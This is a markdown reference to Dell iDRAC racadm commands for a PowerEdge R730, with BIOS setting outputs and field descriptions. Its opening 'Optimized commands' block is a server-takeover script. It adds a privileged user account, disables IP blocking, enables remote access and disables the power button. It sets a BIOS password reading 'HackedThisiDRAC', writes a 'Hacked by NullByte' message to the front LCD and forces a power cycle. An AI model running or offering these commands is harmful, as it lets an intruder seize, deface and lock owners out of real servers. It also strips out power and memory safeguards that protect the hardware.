## Optimized commands
```bash
racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminUserName "{username}"
racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminPassword "{password}"
racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminPrivilege "{privilege}"
racadm config -g cfgUserAdmin -i 10 -o cfgUserAdminEnable 1
sh /avct/sbin/enterprise.sh

racadm set iDRAC.IPBlocking.RangeEnable Disabled
racadm set iDRAC.SSH.Enable 1
racadm set iDRAC.WebServer.Enable 1
racadm set BIOS.SysProfileSettings.SysProfile Custom
racadm set BIOS.SysProfileSettings.EnergyPerformanceBias MaxPower
racadm set System.Power.Cap.Enable Disabled
racadm set System.Power.Hotspare.Enable Disabled
racadm set BIOS.ProcSettings.ControlledTurbo Enabled
racadm set BIOS.SysProfileSettings.UncoreFrequency MaxUFS
racadm set BIOS.SysProfileSettings.MemFrequency MaxPerf
racadm set BIOS.SysProfileSettings.MemPatrolScrub Disabled
racadm set BIOS.ProcSettings.DynamicCoreAllocation Disabled
racadm set BIOS.SysProfileSettings.ProcCStates Disabled
racadm set BIOS.SysProfileSettings.ProcC1E Disabled
racadm set BIOS.SysProfileSettings.MonitorMwait Disabled
racadm set System.ThermalSettings.FanSpeedOffset 1
racadm set BIOS.SysSecurity.PwrButton Disabled
racadm set BIOS.SysSecurity.SetupPassword HackedThisiDRAC 
racadm set System.LCD.Configuration 0
racadm set System.LCD.UserDefinedString "Hacked by NullByte :3     Contact: me@nullbyte.rip" 
racadm jobqueue create BIOS.Setup.1-1 -r pwrcycle -s TIME_NOW
```

## Update
```bash
racadm fwupdate -g -u -a x.x.x.x -d ftp/updates/firmimg.d7
```

## Table of Contents
1. [System Information](#system-information)
2. [Processor Settings](#processor-settings)
3. [Memory Settings](#memory-settings)
4. [System Profile Settings](#system-profile-settings)
5. [Integrated Devices](#integrated-devices)
6. [Slot Configuration](#slot-configuration)
7. [SATA Settings](#sata-settings)
8. [System Security](#system-security)
9. [TPM Advanced Settings](#tpm-advanced-settings)
10. [Miscellaneous Settings](#miscellaneous-settings)
11. [Serial Communication Settings](#serial-communication-settings)

---

## BIOS Categories:
1. `racadm get BIOS.SysInformation`
2. `racadm get BIOS.ProcSettings`
3. `racadm get BIOS.MemSettings`
4. `racadm get BIOS.SysProfileSettings`
5. `racadm get BIOS.IntegratedDevices`
6. `racadm get BIOS.SlotDisablement`
7. `racadm get BIOS.SlotBifurcation`
8. `racadm get BIOS.SataSettings`
9. `racadm get BIOS.SysSecurity`
10. `racadm get BIOS.TpmAdvanced`
11. `racadm get BIOS.MiscSettings`
12. `racadm get BIOS.SerialCommSettings`

---

## 1. System Information

**Command:** `racadm get BIOS.SysInformation`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SysInformation]
#SysMfrContactInfo=www.dell.com
#SystemBiosVersion=2.11.0
#SystemCpldVersion=1.0.1
#SystemManufacturer=Dell Inc.
#SystemMeVersion=3.1.3.72
#SystemModelName=PowerEdge R730
#SystemServiceTag=6713QM2
#UefiComplianceVersion=2.4
```

### Field Descriptions:
- **`#SysMfrContactInfo`**: Manufacturer contact information (read-only)
- **`#SystemBiosVersion`**: BIOS firmware version (read-only)
- **`#SystemCpldVersion`**: Complex Programmable Logic Device version (read-only)
- **`#SystemManufacturer`**: System manufacturer (read-only)
- **`#SystemMeVersion`**: Management Engine version (read-only)
- **`#SystemModelName`**: Server model (read-only)
- **`#SystemServiceTag`**: Dell service tag (read-only)
- **`#UefiComplianceVersion`**: UEFI specification compliance version (read-only)

**Note:** Fields prefixed with `#` are read-only informational fields.

---

## 2. Processor Settings

**Command:** `racadm get BIOS.ProcSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#ProcSettings]
ControlledTurbo=Disabled (Pending Value=Enabled)
CpuInterconnectBusLinkPower=Enabled
DcuIpPrefetcher=Enabled
DcuStreamerPrefetcher=Enabled
DynamicCoreAllocation=Disabled
LogicalProc=Enabled
#Proc1Brand=Intel(R) Xeon(R) CPU E5-2630 v4 @ 2.20GHz
#Proc1Id=6-4F-1
#Proc1L2Cache=10x256 KB
#Proc1L3Cache=25 MB
#Proc1Microcode=0xB000038
#Proc1NumCores=10
#Proc2Brand=Intel(R) Xeon(R) CPU E5-2630 v4 @ 2.20GHz
#Proc2Id=6-4F-1
#Proc2L2Cache=10x256 KB
#Proc2L3Cache=25 MB
#Proc2Microcode=0xB000038
#Proc2NumCores=10
#Proc64bit=Yes
ProcAdjCacheLine=Enabled
ProcAts=Enabled
#ProcBusSpeed=8.0 GT/s
ProcConfigTdp=Nominal
#ProcCoreSpeed=2.20 GHz
ProcCores=All
ProcExecuteDisable=Enabled
ProcHwPrefetcher=Enabled
ProcVirtualization=Enabled
ProcX2Apic=Disabled
QpiSpeed=MaxDataRate
RtidSetting=Disabled
```

### Field Descriptions:
- **`ControlledTurbo`**: Turbo Boost control (currently Disabled, pending Enabled)
- **`CpuInterconnectBusLinkPower`**: CPU interconnect power management
- **`DcuIpPrefetcher`**: Data Cache Unit instruction pointer prefetcher
- **`DcuStreamerPrefetcher`**: Data Cache Unit stream prefetcher
- **`DynamicCoreAllocation`**: Dynamic CPU core allocation
- **`LogicalProc`**: Logical processor/HT enablement
- **`#Proc1Brand`, `#Proc2Brand`**: CPU model information (read-only)
- **`#Proc1Id`, `#Proc2Id`**: CPU identification (read-only)
- **`#Proc1L2Cache`, `#Proc2L2Cache`**: L2 cache size (read-only)
- **`#Proc1L3Cache`, `#Proc2L3Cache`**: L3 cache size (read-only)
- **`#Proc1Microcode`, `#Proc2Microcode`**: CPU microcode version (read-only)
- **`#Proc1NumCores`, `#Proc2NumCores`**: Number of CPU cores (read-only)
- **`#Proc64bit`**: 64-bit support indicator (read-only)
- **`ProcAdjCacheLine`**: Adjacent cache line prefetch
- **`ProcAts`**: Address Translation Services
- **`#ProcBusSpeed`**: Processor bus speed (read-only)
- **`ProcConfigTdp`**: Thermal Design Power configuration
- **`#ProcCoreSpeed`**: Base CPU frequency (read-only)
- **`ProcCores`**: Enabled cores configuration
- **`ProcExecuteDisable`**: Execute Disable Bit (XD/NX bit)
- **`ProcHwPrefetcher`**: Hardware prefetcher
- **`ProcVirtualization`**: Intel VT-x/AMD-V virtualization
- **`ProcX2Apic`**: Extended APIC mode
- **`QpiSpeed`**: QuickPath Interconnect speed setting
- **`RtidSetting`**: Real Time Instruction Distribution

---

## 3. Memory Settings

**Command:** `racadm get BIOS.MemSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#MemSettings]
CorrEccSmi=Enabled
MemOpMode=OptimizerMode
MemTest=Enabled
NodeInterleave=Disabled
SnoopMode=OpportunisticSnoopBroadcast
#SysMemSize=144 GB
#SysMemSpeed=2133 Mhz
#SysMemType=ECC DDR4
#SysMemVolt=1.20 V
#VideoMem=16 MB
```

### Field Descriptions:
- **`CorrEccSmi`**: Correctable ECC error SMI generation
- **`MemOpMode`**: Memory operating mode (Optimizer/Advanced ECC/Mirror/Spare)
- **`MemTest`**: Memory test during POST
- **`NodeInterleave`**: Memory interleaving across NUMA nodes
- **`SnoopMode`**: CPU snoop mode configuration
- **`#SysMemSize`**: Total installed memory (read-only)
- **`#SysMemSpeed`**: Memory speed (read-only)
- **`#SysMemType`**: Memory type (read-only)
- **`#SysMemVolt`**: Memory voltage (read-only)
- **`#VideoMem`**: Integrated video memory allocation (read-only)

---

## 4. System Profile Settings

**Command:** `racadm get BIOS.SysProfileSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SysProfileSettings]
#CollaborativeCpuPerfCtrl=Disabled
#EnergyEfficientTurbo=Disabled
#EnergyPerformanceBias=MaxPower
#MemFrequency=MaxPerf
#MemPatrolScrub=Standard
#MemRefreshRate=1x
#MonitorMwait=Enabled
PowerSaver=Disabled
#Proc1TurboCoreNum=All
#Proc2TurboCoreNum=All
#ProcC1E=Disabled
#ProcCStates=Disabled
#ProcPwrPerf=MaxPerf
#ProcTurboMode=Enabled
SysProfile=PerfOptimized
#UncoreFrequency=MaxUFS
WorkloadProfile=NotAvailable
#WriteDataCrc=Disabled
```

### Field Descriptions:
- **`#CollaborativeCpuPerfCtrl`**: Collaborative CPU performance control (read-only)
- **`#EnergyEfficientTurbo`**: Energy efficient turbo mode (read-only)
- **`#EnergyPerformanceBias`**: Energy vs performance bias (read-only)
- **`#MemFrequency`**: Memory frequency setting (read-only)
- **`#MemPatrolScrub`**: Memory patrol scrub rate (read-only)
- **`#MemRefreshRate`**: Memory refresh rate multiplier (read-only)
- **`#MonitorMwait`**: MONITOR/MWAIT instructions (read-only)
- **`PowerSaver`**: System power saver mode
- **`#Proc1TurboCoreNum`, `#Proc2TurboCoreNum`**: Number of cores in turbo mode (read-only)
- **`#ProcC1E`**: Enhanced C1 state (read-only)
- **`#ProcCStates`**: CPU C-states (read-only)
- **`#ProcPwrPerf`**: CPU power/performance bias (read-only)
- **`#ProcTurboMode`**: Turbo mode status (read-only)
- **`SysProfile`**: System performance profile
- **`#UncoreFrequency`**: Uncore frequency setting (read-only)
- **`WorkloadProfile`**: Workload-specific optimization profile
- **`#WriteDataCrc`**: Write data CRC protection (read-only)

---

## 5. Integrated Devices

**Command:** `racadm get BIOS.IntegratedDevices`

**Output:**
```bash
[Key=BIOS.Setup.1-1#IntegratedDevices]
#CurrentEmbVideoState=Enabled
EmbVideo=Enabled
IntegratedNetwork1=Enabled
IntegratedRaid=Enabled
InternalUsb=On
IoNonPostedPrefetch=Enabled
IoatEngine=Disabled
LowerMmio=Disabled
MmioAbove4Gb=Enabled
OsWatchdogTimer=Disabled
SnoopHldOff=Roll256Cycles
SriovGlobalEnable=Disabled
Usb3Setting=Enabled
UsbPorts=AllOn
```

### Field Descriptions:
- **`#CurrentEmbVideoState`**: Current embedded video status (read-only)
- **`EmbVideo`**: Embedded video controller enablement
- **`IntegratedNetwork1`**: Integrated network controller
- **`IntegratedRaid`**: Integrated RAID controller
- **`InternalUsb`**: Internal USB port enablement
- **`IoNonPostedPrefetch`**: I/O non-posted prefetch buffer
- **`IoatEngine`**: I/O Acceleration Technology
- **`LowerMmio`**: Memory-mapped I/O below 4GB
- **`MmioAbove4Gb`**: Memory-mapped I/O above 4GB
- **`OsWatchdogTimer`**: Operating system watchdog timer
- **`SnoopHldOff`**: Snoop hold-off buffer size
- **`SriovGlobalEnable`**: Single Root I/O Virtualization
- **`Usb3Setting`**: USB 3.0 support
- **`UsbPorts`**: USB port configuration

---

## 6. Slot Configuration

### Slot Disablement
**Command:** `racadm get BIOS.SlotDisablement`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SlotDisablement]
GlobalSlotDriverDisable=Disabled
Slot1=Enabled
Slot2=Enabled
Slot3=Enabled
Slot4=Enabled
Slot5=Enabled
Slot6=Enabled
Slot7=Enabled
```

### Slot Bifurcation
**Command:** `racadm get BIOS.SlotBifurcation`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SlotBifurcation]
Slot1Bif=DefaultBifurcation
Slot2Bif=DefaultBifurcation
Slot3Bif=DefaultBifurcation
Slot4Bif=DefaultBifurcation
Slot5Bif=DefaultBifurcation
Slot6Bif=DefaultBifurcation
Slot7Bif=DefaultBifurcation
```

### Field Descriptions:
- **`GlobalSlotDriverDisable`**: Global PCIe slot driver disablement
- **`Slot1` through `Slot7`**: Individual slot enablement
- **`Slot1Bif` through `Slot7Bif`**: PCIe slot bifurcation configuration

---

## 7. SATA Settings

**Command:** `racadm get BIOS.SataSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SataSettings]
EmbSata=AhciMode
#SataPortA=Auto
#SataPortACapacity=N/A
#SataPortADriveType=Unknown Device
#SataPortAModel=Unknown
#SataPortB=Auto
#SataPortBCapacity=N/A
#SataPortBDriveType=Unknown Device
#SataPortBModel=Unknown
#SataPortC=Auto
#SataPortCCapacity=N/A
#SataPortCDriveType=Unknown Device
#SataPortCModel=Unknown
#SataPortD=Auto
#SataPortDCapacity=N/A
#SataPortDDriveType=Unknown Device
#SataPortDModel=Unknown
#SataPortE=Auto
#SataPortECapacity=N/A
#SataPortEDriveType=Unknown Device
#SataPortEModel=Unknown
#SataPortF=Auto
#SataPortFCapacity=N/A
#SataPortFDriveType=Unknown Device
#SataPortFModel=Unknown
#SataPortG=Auto
#SataPortGCapacity=N/A
#SataPortGDriveType=Unknown Device
#SataPortGModel=Unknown
#SataPortH=Auto
#SataPortHCapacity=N/A
#SataPortHDriveType=Unknown Device
#SataPortHModel=Unknown
#SataPortI=Auto
#SataPortICapacity=N/A
#SataPortIDriveType=Unknown Device
#SataPortIModel=Unknown
#SataPortJ=Auto
#SataPortJCapacity=N/A
#SataPortJDriveType=Optical Drive
#SataPortJModel=PLDS DVD+/-RW DS-8ABSH                  
SecurityFreezeLock=Enabled
WriteCache=Disabled
```

### Field Descriptions:
- **`EmbSata`**: Embedded SATA controller mode
- **`#SataPortA` through `#SataPortJ`**: Port configuration (read-only)
- **`#SataPort*Capacity`**: Drive capacity detection (read-only)
- **`#SataPort*DriveType`**: Detected drive type (read-only)
- **`#SataPort*Model`**: Drive model information (read-only)
- **`SecurityFreezeLock`**: SATA security freeze lock
- **`WriteCache`**: SATA write cache enablement

**Note:** Only SATA Port J shows a connected device (DVD drive).

---

## 8. System Security

**Command:** `racadm get BIOS.SysSecurity`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SysSecurity]
AcPwrRcvry=Last
AcPwrRcvryDelay=Immediate
#AcPwrRcvryUserDelay=60
#AesNi=Enabled
#IntelTxt=Off
NmiButton=Disabled
PasswordStatus=Unlocked
PwrButton=Disabled (Pending Value=Disabled)
SHA256SetupPassword=
SHA256SetupPasswordSalt=
SHA256SystemPassword=
SHA256SystemPasswordSalt=
SecureBoot=Disabled
SecureBootPolicy=Standard
SetupPassword=******** (Write-Only)
SysPassword=******** (Write-Only)
#TpmCommand=None
#TpmFirmware=
#TpmInfo=Type: 1.2-NTC
TpmSecurity=Off
#TpmStatus=Unknown
UefiVariableAccess=Standard
```

### Field Descriptions:
- **`AcPwrRcvry`**: AC power recovery behavior
- **`AcPwrRcvryDelay`**: Power recovery delay
- **`#AcPwrRcvryUserDelay`**: User-defined delay in seconds (read-only)
- **`#AesNi`**: AES-NI instruction support (read-only)
- **`#IntelTxt`**: Intel Trusted Execution Technology status (read-only)
- **`NmiButton`**: NMI button functionality
- **`PasswordStatus`**: System password lock status
- **`PwrButton`**: Power button functionality
- **`SHA256SetupPassword`**: Hashed setup password (secure storage)
- **`SHA256SetupPasswordSalt`**: Password hash salt
- **`SHA256SystemPassword`**: Hashed system password
- **`SHA256SystemPasswordSalt`**: System password salt
- **`SecureBoot`**: UEFI Secure Boot enablement
- **`SecureBootPolicy`**: Secure Boot policy type
- **`SetupPassword`**: Setup password field (write-only)
- **`SysPassword`**: System password field (write-only)
- **`#TpmCommand`**: Pending TPM command (read-only)
- **`#TpmFirmware`**: TPM firmware version (read-only)
- **`#TpmInfo`**: TPM type information (read-only)
- **`TpmSecurity`**: TPM security state
- **`#TpmStatus`**: TPM operational status (read-only)
- **`UefiVariableAccess`**: UEFI variable access control

---

## 9. TPM Advanced Settings

**Command:** `racadm get BIOS.TpmAdvanced`

**Output:**
```bash
[Key=BIOS.Setup.1-1#TpmAdvanced]
#TpmPpiBypassClear=Disabled
#TpmPpiBypassProvision=Disabled
```

### Field Descriptions:
- **`#TpmPpiBypassClear`**: TPM Physical Presence Interface clear bypass (read-only)
- **`#TpmPpiBypassProvision`**: TPM PPI provision bypass (read-only)

---

## 10. Miscellaneous Settings

**Command:** `racadm get BIOS.MiscSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#MiscSettings]
AssetTag=6713QM2
ErrPrompt=Enabled
ForceInt10=Disabled
InSystemCharacterization=Disabled
NumLock=On
```

### Field Descriptions:
- **`AssetTag`**: System asset tag identifier
- **`ErrPrompt`**: Error message display during POST
- **`ForceInt10`**: INT10 video redirection
- **`InSystemCharacterization`**: In-system characterization mode
- **`NumLock`**: NumLock state at boot

---

## 11. Serial Communication Settings

**Command:** `racadm get BIOS.SerialCommSettings`

**Output:**
```bash
[Key=BIOS.Setup.1-1#SerialCommSettings]
ConTermType=Vt100Vt220
ExtSerialConnector=Serial1
FailSafeBaud=115200
RedirAfterBoot=Enabled
SerialComm=OnConRedirAuto
SerialPortAddress=Serial1Com2Serial2Com1
```

### Field Descriptions:
- **`ConTermType`**: Console terminal type
- **`ExtSerialConnector`**: External serial connector assignment
- **`FailSafeBaud`**: Fail-safe baud rate
- **`RedirAfterBoot`**: Redirection after boot completion
- **`SerialComm`**: Serial communication mode
- **`SerialPortAddress`**: Serial port address mapping

**Note:** All read-only fields (prefixed with #) cannot be modified through racadm commands. Pending changes require a system reboot to take effect.
